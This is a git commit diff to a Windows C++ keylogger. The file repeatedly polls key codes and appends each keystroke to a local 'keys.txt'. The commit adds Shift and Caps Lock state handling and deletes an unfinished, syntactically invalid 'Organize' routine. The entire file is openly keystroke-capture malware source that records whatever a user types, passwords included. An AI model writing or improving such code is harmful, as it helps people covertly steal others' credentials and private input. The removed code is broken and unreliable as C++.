a2921a5b1664148fca38966987879a0a97e0c92e
Thomas-Tubinas <143620957+Thomas-Tubinas@users.noreply.github.com>
2024-09-06 23:08:13 -0400

    Update keylogger.cpp

--- keylogger.cpp
+++ keylogger.cpp
@@ -4,16 +4,19 @@
 #include <fstream> 
 
 using namespace std;
+std::string line;
+int currentLine = 0;
+
 void Logging();
 
 int main(){
     Logging();
 }
 
-//Get num lock
 //Way to organize
 void Logging(){
     char c;
+    bool caps = false;
     while (true)
     {
         for(c = 0; c <= 254; c++){
@@ -23,19 +26,32 @@ void Logging(){
                 log.open("keys.txt", ios::app);
                 switch (c) {
                     case VK_BACK:
-                        log << "[backspace]";//delete characters
+                        log << "[backspace]";//delete characters by getting the current line and the last character entered
                         break;
                     case VK_RETURN:
+                        currentLine++;
                         log << "\n";//go to next line
                         break;
                     case VK_SHIFT:
-                        log << "[shift]";
+                        if ((GetKeyState(VK_SHIFT) & 0x0001)!=0){
+                            caps = true;
+                            log << "[Shift Up]";
+                        } else {
+                            caps = false;
+                            log << "[Shift Down]";
+                        }
                         break;
                     case VK_CONTROL:
                         log << "[control]";
                         break;
                     case VK_CAPITAL:
-                        log << "[cap]";
+                        if ((GetKeyState(VK_CAPITAL) & 0x0001)!=0){
+                            caps = true;
+                            log << "[caps on]";
+                        } else {
+                            caps = false;
+                            log << "[caps off]";
+                        }
                         break;
                     case VK_TAB:
                         log << "[tab]";
@@ -49,27 +65,15 @@ void Logging(){
                         log << "[rc]\n";
                         break;
                     default:
-                        log << c;
+                        if(!caps){
+                            char lc = tolower(c);
+                            log << lc;
+                        } else {
+                            log << c;
+                        }
                 }
                 log.close();
             }
         }
     }
-}
-
-void Organize(){
-    log.open("keys.txt", ios::app);
-    for(char c in log)
-    {
-        if(c == '['){
-            int si = log.IndexOf(c);
-        }
-        if(c == "]"){
-            int ei = log.IndexOf(c);
-        }
-        if(si < ei){
-            //put everything from [ to ] and figure out what it means. ex: delete, cap, etc
-        }
-    }
-    Logging();
 }
